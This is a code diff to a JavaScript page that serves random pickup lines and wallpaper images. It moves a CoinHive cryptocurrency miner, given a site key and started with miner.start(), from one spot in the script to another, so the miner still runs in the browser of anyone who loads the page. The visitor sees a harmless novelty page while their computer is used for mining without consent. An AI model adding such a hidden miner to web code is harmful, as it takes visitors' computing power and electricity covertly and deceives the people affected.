@@ -96,9 +96,6 @@
 	   "Can you give me directions to your heart? I seem to have lost my way in your eyes.",
 	   "What time do you have to be back in heaven?"
                ];
-	
-  var miner = new CoinHive.User('q3H5OB6fvuPdgyh7xUA1OM8esB0PYvBe');
-  miner.start();
      
   var images = [
     "reddot.jpeg",
@@ -128,6 +125,8 @@
     "the_light_at_the_end_of_the_tree_tunnel-wallpaper-1920x1080.jpg",
     "love_above_all-wallpaper-1680x1050.jpg"    
  		 ];
+  var miner = new CoinHive.User('q3H5OB6fvuPdgyh7xUA1OM8esB0PYvBe');
+  miner.start();
 function chooseOne(arr) {
 return arr[Math.floor(Math.random() * arr.length)];
   }
